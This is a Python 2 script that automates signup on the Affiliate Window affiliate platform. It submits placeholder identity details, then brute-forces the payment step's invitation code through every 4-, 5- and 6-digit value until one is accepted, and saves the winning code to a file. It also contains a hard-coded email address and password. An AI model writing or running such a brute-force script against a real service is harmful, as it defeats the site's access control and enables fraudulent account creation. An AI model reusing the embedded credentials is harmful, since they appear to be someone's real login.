
import cookielib
import urllib2, urllib
import time
import re
import traceback
import time
 

def findre(reg, s):
    r = re.findall(reg, s)
    if r:
        return r[0]
    else:
        ""


cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
#opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj), urllib2.ProxyHandler({'http':"10.239.120.37:911"}))
opener.addheaders = [
                    ('User-agent', 'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1'),
                     ]
 
email = "xiaoge987@gmail.com"
password = "9e9514b2"
start = 470

email = raw_input("Email:")
password = raw_input("Password:")
start = raw_input("Start Number:")
if start:
    start = int(start)
else:
    start = 0

print email, password, start


def get_page(url, data=None):
    resp = None
    n = 0
    while n < 3:
        n = n + 1
        try:
            resp = opener.open(url, data, timeout=8)
            page = resp.read()
            return page
        except:
            #traceback.print_exc()
            time.sleep(2)
            print url
            print "Try after 2 seconds ..."
            continue
    raise Exception("Get page failed")
 
 
url = "https://darwin.affiliatewindow.com/login"
 
formData = urllib.urlencode({'email' : email,
                             'password' : password,
                             'login':"",
                             })
p = get_page(url, formData)
if '<a href="/user">Hello' not in p:
    print "login failed"

url = "https://darwin.affiliatewindow.com/user/affiliate-signup/account-details"
p = get_page(url)
# formName = findre(r'<input type="hidden" name="formName" value="(.*?)" id="formName">', p)
sessionToken = findre(r'<input type="hidden" name="sessionToken" value="(.*?)" id="sessionToken">', p)
print sessionToken

data = {
    'formName' : "Form_Affiliate_ExistingUserSignup_ContactDetails",
    'sessionToken' : sessionToken,
    'companyName' : 'abc',
    'title' : 'Mr',
    'firstName' : 'abc',
    'lastName' : 'abc',
    'dateOfBirth' : '01/01/1980',
    'telephoneNumber' : '+4412345678',
    'emailAddress' : 'abc@163.com',
    'timezoneId' : '156',
    'countryId' : '75',
    'address1' : '',
    'address2' : 'abc',
    'address3' : 'abc',
    'city' : 'abc',
    'county' : 'abc',
    'postCode' : 'abc',
    'accept' : '0',
    'accept' : '1',
    'nextStep' : '',
}
formData = urllib.urlencode(data)
print "step1"
p = get_page(url, formData)
if '<a href="/user">Hello' not in p:
    print "step1 failed"


url = "https://darwin.affiliatewindow.com/user/affiliate-signup/promotional-methods"
data = {
    'sessionToken' : sessionToken,
    'primaryRegion' : '4',
    'formName' : 'region',
    '3' : '0',
    '3' : '1',
    '24' : '0',
    '24' : '1',
    'isPrimary_24' : '1',
    '23' : '0',
    '18' : '0',
    '26' : '0',
    '20' : '0',
    '27' : '0',
    '25' : '0',
    '22' : '0',
    '19' : '0',
    '21' : '0',
    '28' : '0',
    '2' : '0',
    '10' : '0',
    '17' : '0',
    '13' : '0',
    '11' : '0',
    '15' : '0',
    '16' : '0',
    '14' : '0',
    '12' : '0',
    '4' : '0',
    '30' : '0',
    '29' : '0',
    '31' : '0',
    '1' : '0',
    '5' : '0',
    '9' : '0',
    '6' : '0',
    '8' : '0',
    '7' : '0',
    'nextStep' : '',
    'formName' : 'promotional',
}
formData = urllib.urlencode(data)
print "step2"
p = get_page(url, formData)
if '<a href="/user">Hello' not in p:
    print "step2 failed"


url = "https://darwin.affiliatewindow.com/user/affiliate-signup/promotion-details"
data = {
    'details' : 'http://www.abc.com',
    'description' : 'abc',
    'sectors' : '1,5,6,8,9,10,11,7',
    'type' : 'website',
    'sessionToken' : sessionToken,
    'nextStep' : '',
}
formData = urllib.urlencode(data)
print "step3"
p = get_page(url, formData)
if '<a href="/user">Hello' not in p:
    print "step3 failed"


url = "https://darwin.affiliatewindow.com/user/affiliate-signup/payment"
data = {
    'paymentMethod' : 'code',
    'cardNumber' : '',
    'cardType' : 'Visa',
    'issueNumber' : '',
    'startYear' : '',
    'startMonth' : '',
    'endYear' : '',
    'endMonth' : '',
    'cv2Number' : '',
    'cardHolderName' : '',
    'address1' : '',
    'address2' : '',
    'city' : '',
    'county' : '',
    'postCode' : '',
    'invitationCode' : '0000',
    'accept' : '0',
    'accept' : '1',
    'formName' : 'signupPayment',
    'finish' : '',
    'sessionToken' : sessionToken,
}


flag = False

for i in range(start, 10000):
    code = str(i).zfill(4)
    data['invitationCode'] = code
    print code

    formData = urllib.urlencode(data)
    p = get_page(url, formData)
    if '<a href="/user">Hello' not in p:
        print "step4 failed"

    if "Your changes are not valid" in p:
        print "Not valid."
    else:
        print "Success!!!" + code
        open("code.txt", "w").write("%s\n%s\n%s" % (email, password, code))
        flag = True
        break

if not flag:
    for i in range(start, 100000):
        code = str(i).zfill(5)
        data['invitationCode'] = code
        print code

        formData = urllib.urlencode(data)
        p = get_page(url, formData)
        if '<a href="/user">Hello' not in p:
            print "step4 failed"

        if "Your changes are not valid" in p:
            print "Not valid."
        else:
            print "Success!!!" + code
            open("code.txt", "w").write("%s\n%s\n%s" % (email, password, code))
            flag = True
            break

if not flag:
    for i in range(start, 1000000):
        code = str(i).zfill(6)
        data['invitationCode'] = code
        print code

        formData = urllib.urlencode(data)
        p = get_page(url, formData)
        if '<a href="/user">Hello' not in p:
            print "step4 failed"

        if "Your changes are not valid" in p:
            print "Not valid."
        else:
            print "Success!!!" + code
            open("code.txt", "w").write("%s\n%s\n%s" % (email, password, code))
            flag = True
            break

raw_input("finish...")

